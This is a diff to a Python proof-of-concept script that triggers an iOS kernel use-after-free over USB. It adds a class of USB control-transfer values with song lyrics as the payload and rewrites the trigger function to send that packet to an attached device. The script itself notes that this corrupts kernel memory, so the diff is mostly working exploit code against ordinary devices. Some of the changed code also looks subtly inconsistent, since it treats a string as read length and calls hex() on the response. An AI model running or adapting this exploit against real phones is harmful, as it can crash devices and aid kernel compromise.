@@ -15,10 +15,20 @@ import binascii
 # Though accross different devices and iOS versions the corruption occurs in different parts with different faulting codes.
 # That may mean that more bugs are present in the same interface, triggered the same way.
 
+class LargePTPPacket:
+	res = ""
+	rt = 0
+	r = 0x6
+	v = 0x30c
+	i = 0x409
+	msg = 'COUNTRY ROADS TAKE ME HOME. TO THE PLACE I BELONG. WEST VIRGINIA, MOUNTAIN MOMMA. TAKE ME HOME COUNTRY ROADS'
+	timeout = 4 # Super fast, 250 should be more reliable
+
+
 def banner():
-  print('PoC for iOS Kernel UaF, reachable through USB by @RazMashat, contributions from @userlandkernel')
+  print('PoC for iOS Kernel UaF, reachable through USB')
   print('Original bug by @userlandkernel and @posixninja')
-  print('Copyright © All rights reserved, Minerva Mobile Security & Joshua Hill')
+  print('(C) All rights reserved, Minerva Mobile Security & Joshua Hill')
   print(' ')
 
 def setup():
@@ -28,25 +38,11 @@ def usage():
   print('Example usage: ./poc.py 05ac:12a8')
   
 def poc(device):
-	print('Preparing the first read...')
-
-	res = ""
-	rt = 0
-	r = 0x6
-	v = 0x30c
-	i = 0x409
-	size = 0xa
-	size1= 0x64
-
-	print('Reading for the first time...')
-	res = device.ctrl_transfer(rt|0x80, r, v, i, size,timeout=250) #should always return 40035000540050002000
-	res = binascii.hexlify(res)
-	if res is not "40035000540050002000":
-		print("Magic returned is not PTP? PoC might fail.")
-	print('First read done. PoC should succeed now if the PTP magic got returned: ')
-  
+	print('Creating large PTP USB Packet...')
+	p = LargePTPPacket()
 	try:
-		res = device.ctrl_transfer(rt|0x80, r, v, i, size1,timeout=250)
+		p.res = device.ctrl_transfer(p.rt|0x80, p.r, p.v, p.i, p.msg, timeout=p.timeout)
+		print("response: "+str(hex(p.res)))
 	except Exception as e:
 		print('Caught USB error, which is normal. Just re-attach the device.')
 
